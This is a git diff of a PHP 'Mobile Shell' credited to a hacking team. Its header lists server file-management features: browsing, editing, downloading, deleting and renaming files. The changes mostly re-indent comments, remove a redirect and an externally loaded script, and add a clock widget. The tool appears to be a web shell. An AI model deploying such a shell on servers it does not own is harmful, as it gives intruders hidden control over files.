@@ -1,47 +1,47 @@
-<?php
+	<?php
 
-/*
-#Tools Name:
-	Mobile Shell V 0.1 | The Alien
+	/*
+		#Tools Name:
+			Mobile Shell V 0.1 | The Alien
 
-#Autor:
-THIS TOOL IS CODED BY
-IJAZ UR RAHIM (The Alien)
-  From Team  P . C . G .
-
-Changing Programmers name
-doesn't mean You become 
-the owner of it.
+		#Autor:
+	     THIS TOOL IS CODED BY
+		IJAZ UR RAHIM (The Alien)
+		  From Team  P . C . G .
+		
+		Changing Programmers name
+		doesn't mean You become 
+		the owner of it.
 
 #Greetz to: 
 Syed Umar Arfeen , Shoaib Malik , Usama Arshad , Zain Sabahat , Muhammad Osman and Team Pak Cyber Ghosts (https://www.facebook.com/pakcyberghostsofficial)
 
 #Thanks to:
-	php.net , w3schools.com , google.com and stackoverflow.com
+php.net , w3schools.com , google.com and stackoverflow.com
 
 #Languages used:
-	HTML , CSS (Bootstrap as well) , JavaScript (JQuery most) and PHP
+HTML , CSS (Bootstrap as well) , JavaScript (JQuery most) and PHP
 
 #Features:
-	* Listing Files and Directories.
-	* Show file type with a specific icon.
-	* Show file's/dir's creation/modification time.
-	* Show file's/dir's Permission.
-	* Open Editor for a Specific Type of File.
-	* Download File.
-	* Delete File (also ask for confirmation).
-	* Rename File.
-	More Features will be add in next versions
-#Contact:
-	Facebook (https://www.facebook.com/muibraheem96)
-	Website  (https://www.ijazurrahim.com/)
-	Twitter  (https://www.twtiier.com/muibraheem96)
-	linkedln (https://www.linkedin.com/in/muibraheem96/)
-	instagram(https://www.instagram.com/muibraheem96/)
-	GitHub   (https://www.github.com/IJAZ9913)
-	Fiverr   (https://www.fiverr.com/muibraheem96)
-	Email    (ijazkhan095@gmail.com)
-*/
+* Listing Files and Directories.
+* Show file type with a specific icon.
+* Show file's/dir's creation/modification time.
+* Show file's/dir's Permission.
+* Open Editor for a Specific Type of File.
+* Download File.
+* Delete File (also ask for confirmation).
+* Rename File.
+More Features will be add in next versions
+		#Contact:
+			Facebook (https://www.facebook.com/muibraheem96)
+			Website  (https://www.ijazurrahim.com/)
+			Twitter  (https://www.twtiier.com/muibraheem96)
+			linkedln (https://www.linkedin.com/in/muibraheem96/)
+			instagram(https://www.instagram.com/muibraheem96/)
+			GitHub   (https://www.github.com/IJAZ9913)
+			Fiverr   (https://www.fiverr.com/muibraheem96)
+			Email    (ijazkhan095@gmail.com)
+	*/
 	function filemanager(){
 		$files = '';
 			$dirs = '';
@@ -260,7 +260,7 @@ if (isset($_POST['deletefile']))
 	else
 		echo 2;
 }
-?><!DOCTYPE HTML>
+	?><!DOCTYPE HTML>
 <html lang="en-US">
 <head>
 	<meta charset="UTF-8">
@@ -508,13 +508,31 @@ if (isset($_POST['deletefile']))
 			 	}
 			});
 		}
-	    	if ($("html").width()>900){
-			var win = window.open("https://ijazurrahim.com","_self"); 
-			window.open("mobiShell.php","","width=500,height=800");
+	$(".filemanager").on("click",function(){
+		$(".apps").addClass("hidden");
+		$(".explorer").removeClass("hidden");
+	});
+function startTime() {
+		    var today = new Date();
+		    var h = today.getHours();
+		    var m = today.getMinutes();
+		    m = checkTime(m);
+		     if (h>12) 
+		    {
+		    	h-=12;
+		    	var t = "PM &nbsp;";
+		    }
+		    else
+		    	var t = "AM &nbsp;";
+		    document.getElementById('txt').innerHTML =
+		    h + ":" + m + " " + t;
+		    var t = setTimeout(startTime, 500);
+		}
+		function checkTime(i) {
+		    if (i < 10) {i = "0" + i};  // add zero in front of numbers < 10
+		    return i;
 		}
 </script>
-	<script src="https://www.ijazurrahim.com/mobiShell/js/script.js"></script>
- 
 </head>
 <body> 
 
